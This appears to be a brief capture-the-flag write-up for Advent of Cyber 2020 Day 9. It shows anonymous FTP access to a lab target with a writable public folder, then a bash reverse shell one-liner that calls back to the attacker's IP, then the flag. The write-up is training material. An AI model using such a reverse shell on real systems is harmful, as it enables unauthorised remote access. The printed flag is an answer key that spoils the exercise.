# Advent of cyber 2020

# [Day 9] Networking Anyone can be Santa!


# Taget IP : 10.10.253.71

# My ip : 10.17.6.109

# port 21 FTP

anonymous login available

```bash
ftp 10.10.253.71
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Nov 16  2020 backups
drwxr-xr-x    2 0        0            4096 Nov 16  2020 elf_workshops
drwxr-xr-x    2 0        0            4096 Nov 16  2020 human_resources
drwxrwxrwx    2 65534    65534        4096 Nov 16  2020 public

```


```bash

bash -i >& /dev/tcp/10.17.6.109/4444 0>&1


```

flag.txt : THM{even_you_can_be_santa}
